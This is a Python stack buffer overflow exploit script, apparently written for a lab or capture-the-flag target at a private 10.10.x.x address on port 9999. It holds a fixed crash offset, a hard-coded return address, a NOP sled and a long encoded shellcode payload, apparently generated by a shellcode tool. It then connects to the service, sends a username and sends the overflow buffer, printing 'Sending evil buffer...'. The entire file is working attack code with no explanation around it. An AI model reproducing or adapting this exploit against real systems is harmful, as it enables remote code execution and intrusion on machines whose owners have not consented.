#!/usr/bin/env python3
import socket

ip = "10.10.223.116"
port = 9999

prefix = ""
username = "ueser"
# crashed with 2200 bytes
offset = 2012
overflow = "A" * offset

# 625014DF
retn = "\xdf\x14\x50\x62"
padding = "\x90" * 16

# badchars = "\x00"
payload = ("\xbb\xce\x20\xc7\xef\xdb\xcf\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x52\x31\x58\x12\x83\xe8\xfc\x03\x96\x2e\x25\x1a\xda\xc7\x2b"
"\xe5\x22\x18\x4c\x6f\xc7\x29\x4c\x0b\x8c\x1a\x7c\x5f\xc0\x96"
"\xf7\x0d\xf0\x2d\x75\x9a\xf7\x86\x30\xfc\x36\x16\x68\x3c\x59"
"\x94\x73\x11\xb9\xa5\xbb\x64\xb8\xe2\xa6\x85\xe8\xbb\xad\x38"
"\x1c\xcf\xf8\x80\x97\x83\xed\x80\x44\x53\x0f\xa0\xdb\xef\x56"
"\x62\xda\x3c\xe3\x2b\xc4\x21\xce\xe2\x7f\x91\xa4\xf4\xa9\xeb"
"\x45\x5a\x94\xc3\xb7\xa2\xd1\xe4\x27\xd1\x2b\x17\xd5\xe2\xe8"
"\x65\x01\x66\xea\xce\xc2\xd0\xd6\xef\x07\x86\x9d\xfc\xec\xcc"
"\xf9\xe0\xf3\x01\x72\x1c\x7f\xa4\x54\x94\x3b\x83\x70\xfc\x98"
"\xaa\x21\x58\x4e\xd2\x31\x03\x2f\x76\x3a\xae\x24\x0b\x61\xa7"
"\x89\x26\x99\x37\x86\x31\xea\x05\x09\xea\x64\x26\xc2\x34\x73"
"\x49\xf9\x81\xeb\xb4\x02\xf2\x22\x73\x56\xa2\x5c\x52\xd7\x29"
"\x9c\x5b\x02\xfd\xcc\xf3\xfd\xbe\xbc\xb3\xad\x56\xd6\x3b\x91"
"\x47\xd9\x91\xba\xe2\x20\x72\xcf\xf9\x68\xbc\xa7\xff\x6c\xd1"
"\x6b\x89\x8a\xbb\x83\xdf\x05\x54\x3d\x7a\xdd\xc5\xc2\x50\x98"
"\xc6\x49\x57\x5d\x88\xb9\x12\x4d\x7d\x4a\x69\x2f\x28\x55\x47"
"\x47\xb6\xc4\x0c\x97\xb1\xf4\x9a\xc0\x96\xcb\xd2\x84\x0a\x75"
"\x4d\xba\xd6\xe3\xb6\x7e\x0d\xd0\x39\x7f\xc0\x6c\x1e\x6f\x1c"
"\x6c\x1a\xdb\xf0\x3b\xf4\xb5\xb6\x95\xb6\x6f\x61\x49\x11\xe7"
"\xf4\xa1\xa2\x71\xf9\xef\x54\x9d\x48\x46\x21\xa2\x65\x0e\xa5"
"\xdb\x9b\xae\x4a\x36\x18\xce\xa8\x92\x55\x67\x75\x77\xd4\xea"
"\x86\xa2\x1b\x13\x05\x46\xe4\xe0\x15\x23\xe1\xad\x91\xd8\x9b"
"\xbe\x77\xde\x08\xbe\x5d")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  s.recv(1024)
  s.recv(1024)
  s.send(bytes(username + "\r\n", "latin-1"))
  s.recv(1024)
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
